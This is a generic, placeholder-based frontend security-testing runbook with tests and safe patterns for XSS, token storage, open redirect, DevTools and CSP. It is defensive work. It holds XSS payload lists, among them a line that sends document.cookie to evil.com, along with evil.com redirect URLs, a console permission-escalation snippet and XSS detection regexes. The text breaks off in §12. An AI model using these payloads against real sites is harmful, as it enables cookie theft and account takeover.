# Security Testing Runbook — Frontend (Generic Template)

> **This file contains `{{PLACEHOLDERS}}`.**
> Hydrate every token from the ADAPTATION MANIFEST before use.
> See §16 for the automated bash script and Claude prompt.

**Companion agent**: `security-tester-frontend-generic.md`
**Standards**: WSTG v4.2 · ASVS v4.0.3 Level 1

---

## ADAPTATION MANIFEST (mirrors agent)

| Token | Fill-in | Example |
|---|---|---|
| `{{STACK_NAME}}` | Project name | `SP-MVP1` |
| `{{FE_FRAMEWORK}}` | Framework + version | `Angular 20.3.16`, `React 18`, `Vue 3.4` |
| `{{FE_FILE_EXT}}` | File extension | `ts`, `tsx`, `jsx` |
| `{{TEMPLATE_EXT}}` | Template extension | `html`, `tsx`, `vue` |
| `{{SRC_ROOT}}` | Source root | `src/app`, `src/` |
| `{{SANITIZE_BYPASS_FN}}` | XSS bypass function name | `bypassSecurityTrustHtml`, `dangerouslySetInnerHTML` |
| `{{BINDING_SYNTAX}}` | HTML binding syntax | `[innerHTML]`, `dangerouslySetInnerHTML`, `v-html` |
| `{{DOM_WRITE_PATTERN}}` | Direct DOM write | `nativeElement\.innerHTML`, `\.innerHTML\s*=` |
| `{{SANITIZE_LIB}}` | Sanitisation library | `DOMPurify` |
| `{{LIFECYCLE_HOOK_PATTERN}}` | Post-render lifecycle | `afterRender`, `useEffect`, `mounted` |
| `{{STATE_LIBRARY}}` | State library | `NgRx`, `Redux Toolkit`, `Pinia` |
| `{{DEVTOOLS_MODULE}}` | DevTools module | `StoreDevtoolsModule`, `devTools()` |
| `{{DEVTOOLS_PROD_GUARD}}` | Production guard | `isDevMode()`, `process.env.NODE_ENV !== 'production'` |
| `{{DEVTOOLS_SANITIZER}}` | DevTools sanitizer config | `stateSanitizer`, `actionSanitizer` |
| `{{HTTP_CLIENT}}` | HTTP client | `HttpClient`, `axios`, `fetch` |
| `{{HTTP_INTERCEPTOR}}` | Interceptor mechanism | `HttpInterceptor`, `axios interceptors` |
| `{{ALLOWED_ORIGINS_CONFIG}}` | Origin allowlist name | `ALLOWED_ORIGINS`, `allowedUrls` |
| `{{ROUTER}}` | Router library | `Angular Router`, `React Router v6` |
| `{{NAVIGATE_FN_PATTERN}}` | Navigation function | `router\.navigate\|navigateByUrl`, `navigate\|history\.push` |
| `{{RETURN_URL_PARAM}}` | Redirect param name | `returnUrl`, `redirect`, `next` |
| `{{PERMISSION_LIB}}` | Permission library | `ngx-permissions`, `CASL`, `none` |
| `{{PERMISSION_DIRECTIVE}}` | Permission directive | `*ngxPermissionsOnly`, `<Can>`, `none` |
| `{{PERMISSION_SERVICE}}` | Permission service | `NgxPermissionsService`, `useAbility()` |
| `{{MARKDOWN_LIB}}` | Markdown library + version | `marked 4.2.4`, `react-markdown 9.x` |
| `{{MARKDOWN_PARSE_FN}}` | Parse function | `marked.parse(`, `ReactMarkdown`, `md.render(` |
| `{{MARKDOWN_BROKEN_SANITIZE}}` | No-op sanitize option | `sanitize: true`, `allowDangerousHtml` |
| `{{MARKDOWN_SANITIZE_NOTE}}` | Why it's broken | `removed in marked 4.0`, `pass through by default` |
| `{{VIZ_LIB}}` | Visualisation library | `ECharts`, `Chart.js`, `D3.js` |
| `{{VIZ_FORMATTER_PATTERN}}` | Formatter grep pattern | `formatter\s*:`, `\.html\s*\(` |
| `{{VIZ_ENCODE_FN}}` | Encode function | `echarts.format.encodeHTML`, `DOMPurify.sanitize` |
| `{{THIRD_PARTY_WIDGET}}` | Widget library | `angularx-qrcode`, `react-qr-code`, `none` |
| `{{WIDGET_DATA_BINDING}}` | Widget data prop | `[qrdata]`, `value={`, `:data=` |
| `{{WIDGET_DATA_MAX_LEN}}` | Max safe data length | `2953` (QR), `500`, `none` |
| `{{COMPRESS_LIB}}` | Compress library or `none` | `pako 2.1.0`, `fflate`, `none` |
| `{{COMPRESS_INFLATE_FN}}` | Inflate function | `pako.inflate`, `fflate.decompress`, `none` |
| `{{COMPRESS_MAX_BYTES}}` | Decompression size limit | `10485760` (10 MB) |
| `{{TEST_FRAMEWORK}}` | Test framework | `Karma/Jasmine`, `Jest/RTL`, `Vitest` |
| `{{TEST_DESCRIBE_FN}}` | Describe function | `describe(`, `describe(` |
| `{{TEST_IT_FN}}` | Test case function | `it(`, `test(` |
| `{{TEST_FIXTURE}}` | Component test API | `ComponentFixture`, `render()`, `mount()` |
| `{{PACKAGE_MANAGER}}` | Package manager | `npm`, `pnpm`, `yarn` |
| `{{PROD_BUILD_CMD}}` | Build command | `ng build --configuration production` |
| `{{LINT_CMD}}` | Lint command | `npx eslint src/`, `npm run lint` |
| `{{DEP_AUDIT_CMD}}` | Audit command | `npm audit --audit-level=high` |
| `{{SOURCEMAP_CHECK}}` | Source map check | `ls dist/**/*.map` |
| `{{FRAMEWORK_SPECIFIC_SECTION}}` | Stack-specific section | fill in §13 |

---

## Table of Contents

1. [Test Infrastructure Setup](#0-test-infrastructure-setup)
2. [Framework XSS Sinks & Sanitiser Bypass](#1-framework-xss-sinks--sanitiser-bypass)
3. [Markdown Library XSS](#2-markdown-library-xss)
4. [Visualisation Library Injection](#3-visualisation-library-injection)
5. [Auth Token Storage](#4-auth-token-storage)
6. [HTTP Interceptor Token Leakage](#5-http-interceptor-token-leakage)
7. [State Management DevTools Exposure](#6-state-management-devtools-exposure)
8. [Route Guards & Open Redirect](#7-route-guards--open-redirect)
9. [Client-Side Permission Bypass](#8-client-side-permission-bypass)
10. [Third-Party Widget Injection](#9-third-party-widget-injection)
11. [Compression Library Risks](#10-compression-library-risks)
12. [CSP & Security Headers](#11-csp--security-headers)
13. [Secrets & Bundle Exposure](#12-secrets--bundle-exposure)
14. [Framework-Specific Traps](#13-framework-specific-traps)
15. [ESLint / Static Analysis Configuration](#14-eslint--static-analysis-configuration)
16. [WSTG Checklist Cross-Reference](#15-wstg-checklist-cross-reference)
17. [Hydration Script & Claude Prompt](#16-hydration-script--claude-prompt)

---

## 0 — Test Infrastructure Setup

### XSS test payload library (universal)

```
// {{SRC_ROOT}}/testing/security-test-helpers.{{FE_FILE_EXT}}

export const XSS_PAYLOADS = [
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert(1)>',
    '<script>alert(1)</script>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">',
    '"><script>alert(1)</script>',
    '<body onpageshow=alert(1)>',
    '<details open ontoggle=alert(1)>',  // works in {{MARKDOWN_LIB}}
]

export const MARKDOWN_XSS_PAYLOADS = [
    '[click me](javascript:alert(document.cookie))',
    '<img src=x onerror=alert(1)>',
    '[xss](<javascript:alert(1)>)',
    '![xss](x" onerror="alert(1)")',
    '<details open ontoggle=alert(1)>',
]

// Assert no active XSS vectors in an element's innerHTML
export function assertNoXss(element, label = 'element') {
    const html = element.innerHTML
    const DANGEROUS = [/onerror\s*=/i, /onload\s*=/i, /onclick\s*=/i,
                       /javascript:/i, /<script/i, /data:text\/html/i]
    DANGEROUS.forEach(p => {
        expect(html).not.toMatch(p,
            `XSS pattern "${p}" found in ${label}: ${html.substring(0, 200)}`)
    })
}
```

### Base component test configuration

```
// Using {{TEST_FRAMEWORK}} + {{TEST_FIXTURE}}

beforeEach(async () => {
    await TEST_MODULE_SETUP({
        imports: [COMPONENT_UNDER_TEST, HTTP_MOCK_MODULE],
        providers: [RELEVANT_SERVICES]
    })
    fixture = createFixture(COMPONENT_UNDER_TEST)
    component = fixture.instance
})

afterEach(() => {
    fixture.destroy()
    // Clean up any localStorage / sessionStorage mutations
    localStorage.clear()
    sessionStorage.clear()
})
```

---

## 1 — Framework XSS Sinks & Sanitiser Bypass

**WSTG**: WSTG-INPV-01, WSTG-INPV-02, WSTG-CLNT-01  
**ASVS**: 5.2.1  
**Severity**: Critical

### The risk model for `{{FE_FRAMEWORK}}`

`{{FE_FRAMEWORK}}` sanitises template data bindings by default — binding `serverData`
to a normal template interpolation is safe. The danger arises in three patterns:

1. **`{{SANITIZE_BYPASS_FN}}`**: Explicitly bypasses the sanitiser for the entire
   value. Any call receiving data from an API or user input is a Critical finding.

2. **`{{DOM_WRITE_PATTERN}}`**: Writing to the DOM directly after the framework has
   already completed its render cycle — the sanitiser never runs on this write.

3. **`{{LIFECYCLE_HOOK_PATTERN}}` DOM access**: Post-render lifecycle hooks
   (`{{LIFECYCLE_HOOK_PATTERN}}`) execute after Angular/React/Vue has finished
   sanitising and committing the view. DOM writes inside these hooks bypass sanitisation.

### Diagnostic
```bash
rg "{{SANITIZE_BYPASS_FN}}" --type {{FE_FILE_EXT}} -n
rg "{{DOM_WRITE_PATTERN}}" --type {{FE_FILE_EXT}} -n
rg "{{LIFECYCLE_HOOK_PATTERN}}" --type {{FE_FILE_EXT}} -l \
  | xargs rg "{{DOM_WRITE_PATTERN}}"
```

### Vulnerable vs safe

```
// ❌ CRITICAL — sanitiser entirely bypassed
content = sanitizerService.{{SANITIZE_BYPASS_FN}}(serverApiResponse.htmlContent)
// template: <div [innerHTML]="content">

// ❌ HIGH — direct DOM write post-render
{{LIFECYCLE_HOOK_PATTERN}}(() => {
    elementRef.nativeElement.innerHTML = serverData.label  // sanitiser skipped
})

// ✅ SAFE — normal data binding (framework sanitises by default)
// template: <div [innerHTML]="content">   where content is a plain string
// OR: <div>{{ content }}</div>   (text interpolation — no HTML parsed)

// ✅ BELT-AND-SUSPENDERS — {{SANITIZE_LIB}} before binding
import {{SANITIZE_LIB}} from 'dompurify'

get safeContent(): string {
    return {{SANITIZE_LIB}}.sanitize(this.serverData.description, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOW_DATA_ATTR: false,
    })
}
```

### Test template

```
{{TEST_DESCRIBE_FN}} 'Component — XSS hardening', () => {

    XSS_PAYLOADS.forEach(payload => {
        {{TEST_IT_FN}} `should strip XSS payload: ${payload.substring(0,40)}`, () => {
            component.content = payload
            fixture.detectChanges()
            assertNoXss(
                fixture.nativeElement.querySelector('[data-testid="content"]'),
                'content element'
            )
        })
    })

    {{TEST_IT_FN}} 'should not call {{SANITIZE_BYPASS_FN}} with server data', () => {
        const bypassSpy = spyOn(sanitizerService, '{{SANITIZE_BYPASS_FN}}')
        component.loadData({ description: '<b>Normal text</b>' })
        fixture.detectChanges()
        expect(bypassSpy).not.toHaveBeenCalled()
    })

    {{TEST_IT_FN}} 'should sanitise SVG animate / href patterns', () => {
        const svgPayload = `<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>`
        component.content = svgPayload
        fixture.detectChanges()
        const html = fixture.nativeElement.innerHTML
        expect(html).not.toContain('javascript:')
    })
})
```

---

## 2 — Markdown Library XSS

**WSTG**: WSTG-INPV-01, WSTG-CLNT-01  
**ASVS**: 5.2.1  
**Severity**: High

### The `{{MARKDOWN_LIB}}` specific risk

**`{{MARKDOWN_BROKEN_SANITIZE}}`** — `{{MARKDOWN_SANITIZE_NOTE}}`.

This is the most dangerous migration trap: a codebase upgraded from an older version
of `{{MARKDOWN_LIB}}` may retain an option that was once functional but is now a
silent no-op. The false sense of security it creates means developers stop adding
`{{SANITIZE_LIB}}` on the grounds that "sanitization is already on".

The second risk: most markdown libraries pass through raw HTML embedded in markdown
documents by default. `<img src=x onerror=alert(1)>` embedded inline in markdown
renders as-is without requiring any markdown syntax.

### Test template

```
{{TEST_DESCRIBE_FN}} 'Markdown rendering — XSS hardening', () => {

    MARKDOWN_XSS_PAYLOADS.forEach(payload => {
        {{TEST_IT_FN}} `should sanitise markdown payload: ${payload.substring(0,50)}`, () => {
            // Parse markdown → raw HTML
            const rawHtml = markdownParse(payload)
            // Sanitise with {{SANITIZE_LIB}}
            const sanitised = {{SANITIZE_LIB}}.sanitize(rawHtml)
            // Assert clean
            expect(sanitised).not.toContain('onerror')
            expect(sanitised).not.toContain('javascript:')
            expect(sanitised).not.toMatch(/<script/i)
            expect(sanitised).not.toMatch(/ontoggle/i)
        })
    })

    {{TEST_IT_FN}} 'should confirm {{MARKDOWN_BROKEN_SANITIZE}} is a no-op (regression awareness)', () => {
        // This test documents the known broken behaviour for this library version
        // If this ever starts sanitising, {{SANITIZE_LIB}} is belt-and-suspenders
        // If it doesn't, {{SANITIZE_LIB}} is our only protection
        const payload = '<img src=x onerror=alert(1)>'
        const withOption = markdownParseWithBrokenOption(payload)  // the no-op path
        const sanitised = {{SANITIZE_LIB}}.sanitize(withOption)
        expect(sanitised).not.toContain('onerror')
    })
})
```

### Safe pattern

```
import {{SANITIZE_LIB}} from 'dompurify'
import { markdownParse } from '{{MARKDOWN_LIB}}'

function renderMarkdownSafely(input: string): string {
    const rawHtml = markdownParse(input)           // step 1: parse
    return {{SANITIZE_LIB}}.sanitize(rawHtml, {   // step 2: sanitise ALWAYS
        ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li',
                       'code', 'pre', 'blockquote', 'h1', 'h2', 'h3', 'a'],
        ALLOWED_ATTR: ['href', 'title', 'class'],
        ALLOW_DATA_ATTR: false,
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
    })
}
```

---

## 3 — Visualisation Library Injection

**WSTG**: WSTG-CLNT-01, WSTG-INPV-01  
**ASVS**: 5.2.1  
**Severity**: High

### The risk model for `{{VIZ_LIB}}`

Most data visualisation libraries support rich HTML in tooltips and labels via
formatter functions or HTML mode. These render output **via `innerHTML`** — the
library itself applies no sanitisation. An attacker who controls data returned by
the API (finding names, asset labels, vulnerability descriptions) can inject
arbitrary HTML into chart tooltips.

The canonical attack path: malicious string stored in the backend DB (via another
endpoint) → fetched as chart series data → rendered in tooltip formatter → XSS fires
when analyst opens the dashboard.

### Test template

```
{{TEST_DESCRIBE_FN}} '{{VIZ_LIB}} chart options — XSS hardening', () => {

    const XSS_CHART_PAYLOADS = [
        '<img src=x onerror=alert(document.cookie)>',
        '<script>alert(1)</script>',
        '"><img onerror=alert(1) src=x>',
    ]

    XSS_CHART_PAYLOADS.forEach(payload => {
        {{TEST_IT_FN}} `formatter should encode payload: ${payload.substring(0,40)}`, () => {
            const data = [{ name: payload, value: 42 }]
            const options = buildChartOptions(data)

            // Invoke the formatter function directly
            const formatter = options.tooltip?.formatter
            if (typeof formatter !== 'function') {
                fail('tooltip.formatter must be a function')
                return
            }

            const rendered = formatter({ name: payload, value: 42 })

            expect(rendered).not.toContain('<img')
            expect(rendered).not.toContain('<script')
            expect(rendered).not.toContain('onerror')
            // {{VIZ_ENCODE_FN}} must produce HTML entities
            if (payload.includes('<')) {
                expect(rendered).toContain('&lt;')
            }
        })
    })
})
```

### Safe pattern

```
import * as {{VIZ_LIB_IMPORT}} from '{{VIZ_LIB_PACKAGE}}'

const chartOptions = {
    tooltip: {
        formatter: (params) =>
            // ALWAYS encode server-supplied values before injecting into HTML
            `<b>${{{VIZ_ENCODE_FN}}(String(params.name))}</b>: ` +
            `${{{VIZ_ENCODE_FN}}(String(params.value))}`
    },
    series: [{
        label: {
            // If HTML is not needed in labels, use text-only formatter
            formatter: (params) => String(params.name).substring(0, 50)
        }
    }]
}
```

---

## 4 — Auth Token Storage

**WSTG**: WSTG-SESS-01, WSTG-SESS-02  
**ASVS**: 3.4.1, 3.4.2, 3.4.5  
**Severity**: High

### Storage security model (universal)

| Storage | XSS steal? | CSRF? | Recommendation |
|---|---|---|---|
| `localStorage` | ✅ Yes | ❌ No | ❌ Never for tokens |
| `sessionStorage` | ✅ Yes | ❌ No | ❌ Avoid for tokens |
| In-memory (`{{STATE_LIBRARY}}`) | ❌ No (needs live script) | ❌ No | ✅ Access token only |
| `HttpOnly; Secure; SameSite=Strict` cookie | ❌ No | ✅ Need CSRF token | ✅ Refresh token |

### Test template

```
{{TEST_DESCRIBE_FN}} 'AuthService — token storage security', () => {

    beforeEach(() => {
        localStorage.clear()
        sessionStorage.clear()
    })

    {{TEST_IT_FN}} 'should NOT store access token in localStorage', () => {
        const setItemSpy = spyOn(localStorage, 'setItem')

        authService.handleLoginResponse({
            access_token: 'eyJ.test.token',
            expires_in: 3600
        })

        const tokenCalls = setItemSpy.calls.allArgs()
            .filter(([key]) => /token|jwt|auth|bearer/i.test(key))
        expect(tokenCalls.length).toBe(0,
            `Token in localStorage: ${tokenCalls.map(c => c[0]).join(', ')}`)
    })

    {{TEST_IT_FN}} 'should NOT store access token in sessionStorage', () => {
        const setItemSpy = spyOn(sessionStorage, 'setItem')

        authService.handleLoginResponse({ access_token: 'eyJ.test.token', expires_in: 3600 })

        const tokenCalls = setItemSpy.calls.allArgs()
            .filter(([key]) => /token|jwt|auth|bearer/i.test(key))
        expect(tokenCalls.length).toBe(0)
    })

    {{TEST_IT_FN}} 'should clear all auth state on logout', () => {
        authService.handleLoginResponse({ access_token: 'eyJ.test.token', expires_in: 3600 })
        authService.logout()

        expect(authService.currentToken).toBeNull()
        expect(localStorage.getItem('access_token')).toBeNull()
    })
})
```

---

## 5 — HTTP Interceptor Token Leakage

**WSTG**: WSTG-ATHZ-02, WSTG-CLNT-07  
**ASVS**: 3.5.2  
**Severity**: High

### The domain-filtering requirement

An interceptor that attaches `Authorization: Bearer <token>` to every outgoing
request leaks tokens to:
- Third-party analytics, CDN, or font services
- Any external API called directly from the frontend
- Protocol-relative URLs (`//external.com/path`) which may bypass origin checks

### Test template

```
{{TEST_DESCRIBE_FN}} '{{HTTP_INTERCEPTOR}} — domain filtering', () => {

    const INTERNAL_API = 'https://api.internal.example.com'
    const THIRD_PARTY_URLS = [
        'https://analytics.thirdparty.com/track',
        'https://fonts.googleapis.com/css',
        '//external-partner.com/api/data',  // protocol-relative
    ]

    {{TEST_IT_FN}} 'should attach Authorization header to internal API', () => {
        httpClient.get(`${INTERNAL_API}/data`).subscribe()

        const req = httpMock.expectOne(`${INTERNAL_API}/data`)
        expect(req.request.headers.has('Authorization')).toBeTrue()
        req.flush({})
    })

    THIRD_PARTY_URLS.forEach(url => {
        {{TEST_IT_FN}} `should NOT attach token to third-party: ${url}`, () => {
            httpClient.get(url).subscribe({ error: () => {} })

            const req = httpMock.expectOne(r => r.url === url || r.url.endsWith(url))
            expect(req.request.headers.has('Authorization')).toBeFalse(
                `Token leaked to: ${url}`
            )
            req.flush({})
        })
    })
})
```

### Safe interceptor pattern

```
class {{HTTP_INTERCEPTOR}} {

    // Allowlist — deny all other origins by default
    private ALLOWED_ORIGINS = new Set([
        'https://api.internal.example.com',
        // Add internal origins explicitly — never add third-party origins
    ])

    intercept(request, next) {
        // Block protocol-relative URLs — they leak XSRF tokens
        if request.url.startsWith('//') { return next.handle(request) }

        let origin
        try { origin = new URL(request.url, window.location.origin).origin }
        catch { return next.handle(request) }  // malformed URL — no auth header

        if NOT this.ALLOWED_ORIGINS.has(origin) { return next.handle(request) }

        return next.handle(request.clone({
            setHeaders: { Authorization: `Bearer ${this.authService.getToken()}` }
        }))
    }
}
```

---

## 6 — State Management DevTools Exposure

**WSTG**: WSTG-CONF-05, WSTG-SESS-04  
**ASVS**: 3.1.1, 8.3.4  
**Severity**: Medium–High

### Risk model for `{{STATE_LIBRARY}}` + `{{DEVTOOLS_MODULE}}`

The browser DevTools extension for `{{STATE_LIBRARY}}` can inspect the full state
tree, including time-travel through the last N states. If tokens, passwords, or PII
are stored in state, any user who installs the extension can read them. In production,
`{{DEVTOOLS_MODULE}}` must be absent entirely — or if present for debugging, must
use `{{DEVTOOLS_SANITIZER}}` to redact sensitive fields before the extension sees them.

### Test template

```
{{TEST_DESCRIBE_FN}} '{{STATE_LIBRARY}} DevTools — production configuration', () => {

    {{TEST_IT_FN}} 'should not include {{DEVTOOLS_MODULE}} in production', () => {
        const prodConfig = getProductionAppConfig()
        const providerNames = prodConfig.providers?.map(p =>
            p?.provide?.name ?? p?.name ?? ''
        ) ?? []

        expect(providerNames.some(n => n.includes('DevTools'))).toBeFalse(
            '{{DEVTOOLS_MODULE}} found in production providers'
        )
    })

    {{TEST_IT_FN}} 'should not store raw token in state tree root', () => {
        store.dispatch(loginSuccessAction({ accessToken: 'eyJ.token.sig' }))

        store.pipe(take(1)).subscribe(state => {
            const stateStr = JSON.stringify(state).toLowerCase()
            const sensitiveKeys = ['accesstoken', 'refreshtoken', 'password']
            sensitiveKeys.forEach(key => {
                expect(stateStr.includes(key)).toBeFalse(
                    `Sensitive key "${key}" in state`
                )
            })
        })
    })
})
```

### Safe DevTools configuration

```
// App config — production-gated, with sanitizers
if ({{DEVTOOLS_PROD_GUARD}}) {
    configureDevtools({
        maxAge: 25,   // limit history window
        // Redact sensitive state before DevTools sees it
        stateSanitizer: (state) => ({
            ...state,
            auth: {
                ...state.auth,
                accessToken: state.auth?.accessToken ? '[REDACTED]' : null,
                refreshToken: '[REDACTED]',
            }
        }),
        actionSanitizer: (action) => {
            if action.type.includes('LOGIN_SUCCESS') {
                return { ...action, payload: { ...action.payload, token: '[REDACTED]' } }
            }
            return action
        }
    })
}
```

---

## 7 — Route Guards & Open Redirect

**WSTG**: WSTG-ATHZ-02, WSTG-CLNT-04  
**ASVS**: 4.1.3, 5.1.3  
**Severity**: High

### Open redirect via `{{RETURN_URL_PARAM}}`

Post-login redirect using `{{RETURN_URL_PARAM}}` query parameter is the most common
open redirect in SPAs. After authentication succeeds, the app calls:
`router.navigate(route.queryParams['{{RETURN_URL_PARAM}}'])`. If not validated,
a login link like `/login?{{RETURN_URL_PARAM}}=https://evil.com` causes a redirect
to the attacker's phishing page — which already looks trusted because the URL bar
showed the real app during login.

### Safe redirect validator

```
// Only allow internal paths — relative URLs starting with /
const SAFE_RETURN_URL = /^\/[a-zA-Z0-9\-_/?=&#]*$/

function handlePostLoginRedirect(returnUrl: string | null | undefined) {
    const safe = returnUrl
        && SAFE_RETURN_URL.test(returnUrl)
        && !returnUrl.startsWith('//')    // block protocol-relative
        && returnUrl.length <= 500

    router.navigate(safe ? returnUrl : '/dashboard')
}
```

### Test template

```
{{TEST_DESCRIBE_FN}} 'Auth — open redirect prevention', () => {

    const MALICIOUS_REDIRECTS = [
        'https://evil.com/phishing',
        '//evil.com/steal',
        'javascript:alert(document.cookie)',
        'http://evil.com',
        'data:text/html,<script>alert(1)</script>',
    ]

    const SAFE_PATHS = ['/', '/dashboard', '/findings', '/settings']

    MALICIOUS_REDIRECTS.forEach(url => {
        {{TEST_IT_FN}} `should not redirect to external URL: ${url.substring(0,40)}`, () => {
            const navigateSpy = spyOn(router, 'navigate')
            authService.handlePostLoginRedirect(url)

            if navigateSpy.calls.any() {
                const target = navigateSpy.calls.mostRecent().args[0]
                expect(String(target)).toBe('/dashboard')
                expect(String(target)).not.toContain('evil.com')
            }
        })
    })

    SAFE_PATHS.forEach(path => {
        {{TEST_IT_FN}} `should allow redirect to internal path: ${path}`, () => {
            const navigateSpy = spyOn(router, 'navigate')
            authService.handlePostLoginRedirect(path)
            if navigateSpy.calls.any() {
                expect(navigateSpy.calls.mostRecent().args[0]).toBe(path)
            }
        })
    })
})
```

---

## 8 — Client-Side Permission Bypass

**WSTG**: WSTG-ATHZ-02  
**ASVS**: 4.1.1  
**Severity**: High (misunderstood as a security boundary)

### Why `{{PERMISSION_LIB}}` is not a security control

`{{PERMISSION_LIB}}` runs entirely in the browser. Any user can open the browser
console and call:

```javascript
// Instant privilege escalation — no server request needed
permissionService.addPermission('SUPER_ADMIN')
// or: window.__store.dispatch(setPermissions(['ADMIN']))
```

This immediately reveals all UI elements gated by `{{PERMISSION_DIRECTIVE}}`. The
server API **must** independently validate every request. The test that matters is
not a frontend test — it is confirming that a direct API call without the UI
permission check returns 403.

### Test template

```
{{TEST_DESCRIBE_FN}} '{{PERMISSION_LIB}} — client-side bypass awareness', () => {

    {{TEST_IT_FN}} 'should document that {{PERMISSION_LIB}} is UI-only, not a security boundary', () => {
        // This test is intentionally here to make the constraint visible in the test suite.
        // Any reviewer who removes it must acknowledge the security implication.
        const WARNING = '{{PERMISSION_LIB}} directives are UX-only. ' +
            'Every API endpoint they gate must enforce authz server-side.'
        expect(WARNING).toBeTruthy()
    })

    {{TEST_IT_FN}} 'should not use {{PERMISSION_LIB}} as the sole protection on sensitive routes', () => {
        // Sensitive routes must combine {{PERMISSION_LIB}} with an auth guard
        const sensitiveRoutes = APP_ROUTES.filter(r =>
            ['/admin', '/config', '/users/manage'].some(p => String(r.path).includes(p.replace('/','')
        )))

        sensitiveRoutes.forEach(route => {
            const guards = route.canActivate ?? []
            const guardNames = guards.map(g => g.name ?? String(g))
            const hasAuthGuard = guardNames.some(n => n.toLowerCase().includes('auth'))
            expect(hasAuthGuard).toBeTrue(
                `Route "${route.path}" uses {{PERMISSION_LIB}} without AuthGuard`
            )
        })
    })
})
```

---

## 9 — Third-Party Widget Injection

**WSTG**: WSTG-CLNT-01  
**ASVS**: 5.2.1  
**Severity**: Medium

> **Skip this section if `{{THIRD_PARTY_WIDGET}}` = `none`.**

### Risk model

`{{THIRD_PARTY_WIDGET}}` renders output to `<canvas>` or `<svg>`. When the widget
uses SVG output mode, raw data values may appear in SVG `title`, `desc`, or attribute
nodes without encoding. An attacker who controls `{{WIDGET_DATA_BINDING}}` can
inject SVG attributes or trigger a DoS by supplying oversized data.

### Test template

```
{{TEST_DESCRIBE_FN}} 'Widget — data validation', () => {

    const INVALID_INPUTS = [
        'A'.repeat({{WIDGET_DATA_MAX_LEN}} + 100),  // exceeds limit
        '<svg onload=alert(1)>',                     // SVG injection
        'javascript:alert(1)',                        // protocol injection
    ]

    INVALID_INPUTS.forEach(input => {
        {{TEST_IT_FN}} `should reject invalid data: ${input.substring(0,30)}`, () => {
            component.setWidgetData(input)
            fixture.detectChanges()

            const widgetEl = fixture.debugElement.query(By.css('{{THIRD_PARTY_WIDGET}}'))
            expect(widgetEl.properties['data']).not.toBe(input)
            // Must fall back to safe default
            expect(widgetEl.properties['data']).not.toContain('javascript:')
            expect(widgetEl.properties['data']).not.toContain('onerror')
        })
    })
})
```

---

## 10 — Compression Library Risks

**WSTG**: WSTG-BUSL-07  
**ASVS**: 13.3.1  
**Severity**: Medium

> **Skip this section if `{{COMPRESS_LIB}}` = `none`.**

### The decompression bomb pattern

A `zip bomb` — small compressed file that decompresses to gigabytes — crashes the
browser tab if fed to `{{COMPRESS_INFLATE_FN}}` without a size limit. The safe
pattern uses a streaming inflate API that checks bytes consumed before
each chunk is appended, rather than the synchronous all-at-once API.

### Test template

```
{{TEST_DESCRIBE_FN}} '{{COMPRESS_LIB}} — decompression size limit', () => {

    {{TEST_IT_FN}} 'should reject decompressed output exceeding {{COMPRESS_MAX_BYTES}} bytes', () => {
        const oversize = 'A'.repeat({{COMPRESS_MAX_BYTES}} + 1024)
        const compressed = {{COMPRESS_LIB}}.compress(oversize)

        expect(() => safeInflate(compressed))
            .toThrowError(/exceeds limit|too large/i)
    })

    {{TEST_IT_FN}} 'should not call JSON.parse on unvalidated decompressed output', () => {
        const jsonParseSpy = spyOn(JSON, 'parse')
        const malformed = {{COMPRESS_LIB}}.compress('{"evil": true}')

        try { safeInflate(malformed) } catch { /* expected if oversized */ }

        if jsonParseSpy.calls.any() {
            const parsedInput = jsonParseSpy.calls.mostRecent().args[0]
            expect(String(parsedInput).length).toBeLessThan({{COMPRESS_MAX_BYTES}})
        }
    })
})
```

### Safe inflate wrapper

```
const MAX_DECOMPRESSED = {{COMPRESS_MAX_BYTES}}  // bytes

function safeInflate(input: Uint8Array): string {
    let total = 0
    const chunks: string[] = []

    // Use streaming API (library-dependent — adapt for {{COMPRESS_LIB}})
    const stream = new {{COMPRESS_LIB}}.InflateStream({ to: 'string' })
    stream.onData = (chunk) => {
        total += chunk.length
        if total > MAX_DECOMPRESSED {
            throw new Error(`Decompressed data exceeds limit of ${MAX_DECOMPRESSED} bytes`)
        }
        chunks.push(chunk)
    }
    stream.push(input, true)
    if stream.err { throw new Error(`Decompression error: ${stream.msg}`) }
    return chunks.join('')
}
```

---

## 11 — CSP & Security Headers

**WSTG**: WSTG-CONF-12, WSTG-CONF-07, WSTG-CONF-14, WSTG-CLNT-09  
**ASVS**: 14.4.1, 14.4.2, 14.4.3  
**Severity**: Medium–High

### Target CSP (stack-agnostic baseline)

```nginx
# Server config (adapt for nginx / Apache / Caddy / Cloudflare / Lambda@Edge)
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM}';      # nonce per request, no unsafe-inline
    style-src 'self' 'nonce-{RANDOM}';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.internal.example.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';                   # clickjacking
    upgrade-insecure-requests;

X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Test template

```
{{TEST_DESCRIBE_FN}} 'Security headers', () => {

    {{TEST_IT_FN}} 'CSP header should not contain unsafe-inline', async () => {
        const response = await fetch(window.location.origin)
        const csp = response.headers.get('Content-Security-Policy') ?? ''

        expect(csp).withContext('CSP header missing').toBeTruthy()
        expect(csp).not.toContain('unsafe-inline',
            `CSP has unsafe-inline — XSS protections weakened: ${csp}`)
        expect(csp).not.toContain('unsafe-eval')
        expect(csp).toContain("frame-ancestors 'none'")
        expect(csp).toContain("object-src 'none'")
    })
})
```

---

## 12 — Secrets & Bundle Exposure

**WSTG**: WSTG-CONF-05  
**ASVS**: 14.2.2  
**Severity**: High

### What should never appear in `environment.ts` / `.env`

```
// ❌ NEVER — these values are in the public JS bundle
apiKey: 'sk-live-1234567890abcdef'       // secret
backendUrl: 'http://10.0.0.45:8080'      // internal IP topology
